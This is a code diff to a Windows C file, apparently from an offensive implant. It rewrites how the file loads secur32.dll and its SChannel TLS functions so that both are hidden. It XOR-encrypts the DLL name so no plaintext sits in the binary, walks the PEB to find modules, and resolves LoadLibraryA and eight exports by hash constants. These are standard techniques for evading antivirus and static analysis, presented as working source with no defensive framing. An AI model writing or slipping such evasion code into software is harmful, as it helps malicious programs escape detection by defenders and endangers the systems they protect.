@@ -8,7 +8,10 @@
 #include <windows.h>
 #include <sspi.h>
 #include <schannel.h>
-#pragma comment(lib, "secur32.lib")
+
+#include "peb.h"
+#include "export_resolve.h"
+#include "hash.h"
 
 /* ── SChannel constants (guard against mingw redefines) ─────────── */
 
@@ -62,10 +65,17 @@
 
 /* SecPkgContext_StreamSizes and SCHANNEL_CRED are defined in Windows headers */
 
-/* ── dynamic load from secur32.dll ─────────────────────────────── */
+/* ── XOR-encrypted strings (no plaintext in .rdata) ─────────────── */
+
+static const uint8_t enc_secur32_dll[] = {
+    0x3c,0x08,0x06,0x12,0x13,0x13,0x61,0x5a,0x01,0x0d,0x00
+};
+#define SECUR32_DLL_LEN 11
 
 static HMODULE g_secur32 = NULL;
 static int g_sec_loaded = 0;
+
+/* Function pointer types for secur32 exports */
 
 typedef SECURITY_STATUS (WINAPI *pAcquireCredA)(
     PCSTR, PCSTR, ULONG, PVOID, PVOID,
@@ -96,19 +106,42 @@ static pDeleteSecCtx    fn_DeleteCtx  = NULL;
 static pFreeCtxBuffer   fn_FreeBuf    = NULL;
 static pQueryCtxAttrA   fn_QueryAttr  = NULL;
 
+/* Resolve function by XOR-encrypted hash (27 iters, exact case) */
+static void* resolve_fn(void* mod, uint32_t hash) {
+    return mirage_get_function_by_hash(mod, hash);
+}
+
 static int sec_ensure_loaded(void) {
     if (g_sec_loaded) return 1;
-    g_secur32 = LoadLibraryA("secur32.dll");
-    if (!g_secur32) return 0;
 
-    fn_Acquire   = (pAcquireCredA)   GetProcAddress(g_secur32, "AcquireCredentialsHandleA");
-    fn_InitSec   = (pInitSecCtxA)    GetProcAddress(g_secur32, "InitializeSecurityContextA");
-    fn_Encrypt   = (pEncryptMsg)     GetProcAddress(g_secur32, "EncryptMessage");
-    fn_Decrypt   = (pDecryptMsg)     GetProcAddress(g_secur32, "DecryptMessage");
-    fn_FreeCred  = (pFreeCredHandle) GetProcAddress(g_secur32, "FreeCredentialsHandle");
-    fn_DeleteCtx = (pDeleteSecCtx)   GetProcAddress(g_secur32, "DeleteSecurityContext");
-    fn_FreeBuf   = (pFreeCtxBuffer)  GetProcAddress(g_secur32, "FreeContextBuffer");
-    fn_QueryAttr = (pQueryCtxAttrA)  GetProcAddress(g_secur32, "QueryContextAttributesA");
+    /* Try PEB walk first — secur32.dll may already be loaded */
+    uint8_t tmp[SECUR32_DLL_LEN];
+    mirage_xor_decrypt(enc_secur32_dll, tmp, SECUR32_DLL_LEN);
+    uint32_t mod_hash = mirage_encrypted_hash_module((const char*)tmp);
+    g_secur32 = (HMODULE)mirage_get_module_by_hash(mod_hash);
+
+    /* Fallback: load via encrypted string */
+    if (!g_secur32) {
+        typedef HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
+        uint32_t k32_hash = mirage_encrypted_hash_module("kernel32.dll");
+        void* k32 = mirage_get_module_by_hash(k32_hash);
+        if (!k32) return 0;
+        pLoadLibraryA fnLoad = (pLoadLibraryA)resolve_fn(k32,
+            mirage_encrypted_hash_func("LoadLibraryA"));
+        if (!fnLoad) return 0;
+        g_secur32 = fnLoad((const char*)tmp);
+        if (!g_secur32) return 0;
+    }
+
+    /* Resolve all 8 exports by hash */
+    fn_Acquire   = (pAcquireCredA)   resolve_fn(g_secur32, 0xBFF60A9Bu); /* AcquireCredentialsHandleA */
+    fn_InitSec   = (pInitSecCtxA)    resolve_fn(g_secur32, 0x1F8FADE7u); /* InitializeSecurityContextA */
+    fn_Encrypt   = (pEncryptMsg)     resolve_fn(g_secur32, 0xEA9275EFu); /* EncryptMessage */
+    fn_Decrypt   = (pDecryptMsg)     resolve_fn(g_secur32, 0x124EDDF4u); /* DecryptMessage */
+    fn_FreeCred  = (pFreeCredHandle) resolve_fn(g_secur32, 0x07765BA3u); /* FreeCredentialsHandle */
+    fn_DeleteCtx = (pDeleteSecCtx)   resolve_fn(g_secur32, 0x37E86A76u); /* DeleteSecurityContext */
+    fn_FreeBuf   = (pFreeCtxBuffer)  resolve_fn(g_secur32, 0x3A352AD6u); /* FreeContextBuffer */
+    fn_QueryAttr = (pQueryCtxAttrA)  resolve_fn(g_secur32, 0x4A0B10E0u); /* QueryContextAttributesA */
 
     if (!fn_Acquire || !fn_InitSec || !fn_Encrypt || !fn_Decrypt ||
         !fn_FreeCred || !fn_DeleteCtx || !fn_FreeBuf || !fn_QueryAttr)
